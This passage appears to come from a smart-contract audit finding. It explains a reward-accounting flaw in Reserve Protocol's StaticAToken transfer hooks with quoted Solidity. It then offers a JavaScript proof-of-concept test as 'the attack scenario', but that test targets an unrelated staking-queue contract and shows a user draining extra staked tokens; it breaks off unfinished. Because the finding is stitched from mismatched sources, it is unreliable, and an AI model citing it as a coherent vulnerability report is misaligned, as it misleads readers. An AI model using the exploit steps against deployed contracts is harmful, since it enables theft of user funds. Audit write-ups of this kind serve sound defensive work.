    return amount.rayDiv(rate_);
}
```

As denoted in the function NatSpec below, function `_beforeTokenTransfer` updates rewards for senders and receivers in a [`transfer`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/vendor/ERC20.sol#L223-L250).

```solidity
/**
 * @notice Updates rewards for senders and receiver in a transfer (not updating rewards for address(0))
 * @param from The address of the sender of tokens
 * @param to The address of the receiver of tokens
 */
function _beforeTokenTransfer(
    address from,
    address to,
    uint256
) internal override {
    if (address(INCENTIVES_CONTROLLER) == address(0)) {
        return;
    }
    if (from != address(0)) {
        _updateUser(from);
    }
    if (to != address(0)) {
        _updateUser(to);
    }
}
```

When function `_updateUser` is respectively invoked, `_getPendingRewards(user, balance, false)` is called.

```solidity
/**
 * @notice Adding the pending rewards to the unclaimed for specific user and updating user index
 * @param user The address of the user to update
 */
function _updateUser(address user) internal {
    uint256 balance = balanceOf(user);
    if (balance > 0) {
        uint256 pending = _getPendingRewards(user, balance, false);
        _unclaimedRewards[user] = _unclaimedRewards[user].add(pending);
    }
    _updateUserSnapshotRewardsPerToken(user);
}
```

However, because the third parameter has been entered `false`, the third if block of function `_getPendingRewards` is skipped.

```solidity
/**
 * @notice Compute the pending in RAY (rounded down). Pending is the amount to add (not yet unclaimed) rewards in RAY (rounded down).
 * @param user The user to compute for
 * @param balance The balance of the user
 * @param fresh Flag to account for rewards not claimed by contract yet
 * @return The amount of pending rewards in RAY
 */
function _getPendingRewards(
    address user,
    uint256 balance,
    bool fresh
) internal view returns (uint256) {
    if (address(INCENTIVES_CONTROLLER) == address(0)) {
        return 0;
    }

    if (balance == 0) {
        return 0;
    }

    uint256 rayBalance = balance.wadToRay();

    uint256 supply = totalSupply();
    uint256 accRewardsPerToken = _accRewardsPerToken;

    if (supply != 0 && fresh) {
        address[] memory assets = new address[](1);
        assets[0] = address(ATOKEN);

        uint256 freshReward = INCENTIVES_CONTROLLER.getRewardsBalance(assets, address(this));
        uint256 lifetimeRewards = _lifetimeRewardsClaimed.add(freshReward);
        uint256 rewardsAccrued = lifetimeRewards.sub(_lifetimeRewards).wadToRay();
        accRewardsPerToken = accRewardsPerToken.add(
            (rewardsAccrued).rayDivNoRounding(supply.wadToRay())
        );
    }

    return
        rayBalance.rayMulNoRounding(accRewardsPerToken.sub(_userSnapshotRewardsPerToken[user]));
}
```

Hence, `accRewardsPerToken` may not be updated with the latest rewards from `INCENTIVES_CONTROLLER`. Consequently, `_updateUserSnapshotRewardsPerToken(user)` will miss out on claiming some rewards and is a loss to the StaticAtoken transferrer.

```solidity
/**
 * @notice Update the rewardDebt for a user with balance as his balance
 * @param user The user to update
 */
function _updateUserSnapshotRewardsPerToken(address user) internal {
    _userSnapshotRewardsPerToken[user] = _accRewardsPerToken;
}
```

Ironically, this works out as a zero-sum game where the loss of the transferrer is a gain to the transferee. But most assuredly, the Backing Manager is going to end up incurring more losses than gains in this regard.

The below test case shows the attack scenario.
```javascript
  it('Cyfrin: off-chain mechanism in an incorrect order can lead to user funds being stolen', async () => {
    // try deposit 1500 while the capacity is 1000
    await strategy.setMaxDeposits(toEther(1000))
    await sq.connect(signers[1]).deposit(toEther(1500), true)

    // 500 ether is queued for accounts[1]
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)

    // unqueue 500 ether should work while no updateDistribution was called
    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 0)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)

    // deposit again
    await sq.connect(signers[1]).deposit(toEther(500), true)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)

    // victim deposits 500 ether and it will be queued
    await sq.connect(signers[2]).deposit(toEther(500), true)
    assert.equal(fromEther(await sq.totalQueued()), 1000)

    // max deposit has increased to 1500
    await strategy.setMaxDeposits(toEther(1500))

    // user sees that his queued tokens 500 can be deposited and call depositQueuedTokens
    // this will deposit the 500 ether in the queue
    await sq.connect(signers[1]).depositQueuedTokens()

    // Correct off-chain mechanism: pauseForUpdate -> getAccountData -> updateDistribution
    // Let us see what happens if getAccountData is called before pauseForUpdate

    // await sq.pauseForUpdate()

    // check account data
    var a_data = await sq.getAccountData()
    assert.equal(ethers.utils.formatEther(a_data[2][1]), "500.0")
    assert.equal(ethers.utils.formatEther(a_data[2][2]), "500.0")

    // user calls unqueueTokens to get his 500 ether back
    // this is possible because the queue contract is not paused
    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))

    // pauseForUpdate is called at a wrong order
    await sq.pauseForUpdate()

    // at this point user has 1000 ether staked and 9000 ether in his wallet
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)

    // now updateDistribution is called with the wrong data
    let data = [
      [ethers.constants.AddressZero, toEther(0), toEther(0)],
      [accounts[1], toEther(500), toEther(500)],
    ]
    let tree = StandardMerkleTree.of(data, ['address', 'uint256', 'uint256'])

    await sq.updateDistribution(
      tree.root,
      ethers.utils.formatBytes32String('ipfs'),
      toEther(500),
      toEther(500)
    )

    // at this point user claims his LSD tokens
    await sq.connect(signers[1]).claimLSDTokens(toEther(500), toEther(500), tree.getProof(1))

    // at this point user has 1500 ether staked and 9000 ether in his wallet
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1500)
